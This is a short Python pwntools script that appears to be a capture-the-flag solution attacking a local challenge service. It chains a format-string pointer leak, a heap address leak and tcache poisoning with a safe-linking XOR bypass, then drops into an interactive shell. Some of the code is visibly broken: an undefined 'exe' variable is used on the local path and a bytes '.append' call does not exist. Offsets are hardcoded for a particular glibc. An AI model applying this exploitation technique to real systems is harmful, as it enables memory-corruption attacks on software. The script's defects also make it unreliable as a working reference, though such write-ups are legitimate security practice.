#!/usr/bin/env python3

from pwn import *

#exe = ELF("./chall")

#context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("127.0.0.1", 1337)

    return r


def main():
    r = conn()

    r.sendline(b'%p')
    leek = int(r.recvline().strip().split()[-1], 16)
    print(hex(leek))
    leek=leek+0x2130 #the offset might change depending on os and glibc
    print(r.recvline())
    print(r.recvline())
    def new(index,size):
        r.sendline(b'1')
        r.sendline(index)
        r.sendline(size)
    def write(index,value):
        payload=(b'A'*index*0x08).append(value)
        r.sendline(b'3')
        r.sendline(payload)
    def shell():
        r.sendline(b'4')
    def read():
        r.sendline(b'2')
    def leekheap():
        r.sendline(b'3')
        r.sendline(b'2')
        r.sendline(b'%p %p %p')
    def delete(index):
        r.sendline(b'2')
        r.sendline(index)
    new(b'1',b'128')
    new(b'2',b'128')
    delete(b'1')
    delete(b'2')
    leekheap()
    info=r.recvuntil('has').split()[-2][2:]
    print(info)
    heap_leek=int(info,16)
    print(hex(heap_leek))
    
    payload=p64(leek ^ (heap_leek>>12))
    print(payload)
    r.sendline(b'3')
    r.sendline(b'2')
    r.sendline(payload)
    new(b'1',b'128')
    r.interactive()


if __name__ == "__main__":
    main()
